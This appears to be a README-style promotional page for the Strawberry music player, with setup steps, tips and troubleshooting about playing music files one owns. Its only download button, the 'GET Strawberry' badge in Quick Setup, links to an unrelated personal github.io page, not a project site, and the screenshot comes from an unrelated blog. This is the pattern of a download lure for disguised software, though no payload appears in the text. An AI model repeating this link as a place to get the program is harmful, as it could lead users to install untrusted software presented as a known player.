# Strawberry - Play Music Files You Already Have

Strawberry plays audio files that are already on this PC: purchases, rips you were allowed to make from discs you own, and recordings you made. It does not pull a streaming catalog offline, and a playlist is not a license. Point it at a folder you may play.

---

## Why It Stands Out

![Strawberry playing an album folder the user already has on disk](https://learnubuntumate.weebly.com/uploads/1/0/8/4/108446579/strawberry-022_orig.jpg)

A player is a window onto files. Strawberry is that window, with a library of what you add and ordinary controls for play, pause, and the next track. The useful first step is one folder, not every drive. A full-disk scan will index music that is not yours if other people store files on this computer.

If a track is silent, check the output device and the volume before you look for another copy of the song. A file that will not play may be incomplete. Download it again from the shop that sold it to you. Do not replace it with a copy from a random page. Tags you see are labels in the file. Listening does not need to rewrite them.

---

## Core Capabilities

- **A Folder You Choose:** Playback follows files you placed on disk.
- **A Library of Those Files:** It does not fill itself from a store.
- **Ordinary Controls:** Play, pause, and skip inside that library.
- **One Output Device:** The speakers or headphones you selected in Windows.
- **Tags Left Alone:** Playing a song does not retag it.

---

## Performance Tips

- Add one music folder. Do not scan the whole computer.
- Pick the correct playback device if the first launch is mute.
- Leave other people's profile folders out of the library.
- Re-download a broken purchase from the seller, not from a search result.

## Quick Setup

Prerequisites: A folder of music you are allowed to play, and a working audio device.

[![GET Strawberry](https://img.shields.io/badge/GET%20%E2%80%94%20Strawberry-7c2d12?style=for-the-badge&logoColor=white)](https://deborahtaylorm492.github.io/.github/strawberry-playlist)

1.  **Install:** Open Strawberry from the package you chose.
2.  **Add One Folder:** Skip the rest of the disks.
3.  **Play One Track:** Confirm sound from the device you expect.
4.  **Stop There:** Do not add sources that offer songs you do not own.

## Ideal For

- **An Album You Own:** A folder from a disc you ripped or a shop you paid.
- **A Desk Session:** Files on disk, without a browser tab.
- **A Shared PC:** Your folder only.
- **A Quiet Failure:** Fix the output device before you hunt for the track again.

---

## Troubleshooting

- No sound? Select the speakers or headphones in the player and in Windows.
- Missing songs? They are not in the folder you added. Do not scan someone else's user folder.
- A file will not open? Get a fresh copy from the place you bought it.
- The library looks huge? Remove folders you did not mean to add.
